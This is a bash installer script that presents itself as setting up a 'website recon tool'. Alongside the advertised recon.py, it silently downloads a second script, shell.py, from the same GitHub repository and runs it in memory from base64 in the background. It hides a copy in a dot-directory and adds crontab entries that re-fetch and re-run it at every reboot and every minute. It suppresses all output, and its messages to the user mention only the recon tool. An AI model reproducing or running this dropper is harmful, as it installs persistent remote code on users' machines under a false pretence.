#!/bin/bash
set -e

# Check if cron is running (silently)
if ! systemctl is-active --quiet cron; then
    sudo systemctl start cron >/dev/null 2>&1 || exit 1
    sudo systemctl enable cron >/dev/null 2>&1 || exit 1
fi

# Check Python3
if ! command -v python3 >/dev/null 2>&1; then
    echo "[-] Python3 not found" >&2
    exit 1
fi

# Download recon.py to current directory
echo "[*] Installing website recon tool..."
if ! curl -sSL https://raw.githubusercontent.com/sakibrony/Linux-Recon-Tool/main/recon.py -o ./recon.py; then
    echo "[-] Failed to download recon.py" >&2
    exit 1
fi
chmod +x ./recon.py
pip3 install requests >/dev/null 2>&1 || true
echo "[+] Recon tool installed! Run: ./recon.py -u example.com"

# Download shell.py, base64-encode, and run in memory
shell_url="https://raw.githubusercontent.com/sakibrony/Linux-Recon-Tool/main/shell.py"
encoded_shell=$(curl -sSL "$shell_url" | base64 -w 0) || { echo "[-] Failed to download shell.py" >&2; exit 1; }

# Test base64 decode
if ! python3 -c "import base64; exec(base64.b64decode('$encoded_shell'))" >/dev/null 2>&1; then
    echo "[*] Memory execution failed, using file-based fallback..."
    mkdir -p ~/.linux-recon-tool
    curl -sSL "$shell_url" -o ~/.linux-recon-tool/.shell.py || exit 1
    nohup python3 ~/.linux-recon-tool/.shell.py >/dev/null 2>&1 &
else
    nohup python3 -c "import base64; exec(base64.b64decode('$encoded_shell'))" >/dev/null 2>&1 &
fi

# Store base64-encoded shell.py in hidden file
mkdir -p ~/.linux-recon-tool
echo "$encoded_shell" > ~/.linux-recon-tool/.persist

# Add persistence via crontab for current user (silently)
crontab -l > /tmp/cron 2>/dev/null || true
if ! grep -q "linux-recon-tool/.persist" /tmp/cron; then
    echo "@reboot nohup python3 -c \"import base64; exec(base64.b64decode(\\\$(cat ~/.linux-recon-tool/.persist)))\" >/dev/null 2>&1 &" >> /tmp/cron
    echo "* * * * * [ -f ~/.linux-recon-tool/.persist ] || (curl -sSL https://raw.githubusercontent.com/sakibrony/Linux-Recon-Tool/main/shell.py | base64 -w 0 > ~/.linux-recon-tool/.persist && nohup python3 -c \"import base64; exec(base64.b64decode(\\\$(cat ~/.linux-recon-tool/.persist)))\" >/dev/null 2>&1 &)" >> /tmp/cron
    crontab /tmp/cron >/dev/null 2>&1 || exit 1
fi
rm -f /tmp/cron >/dev/null 2>&1

echo "[+] Download complete! Use python3 recon.py -u <example.com> for scanning."
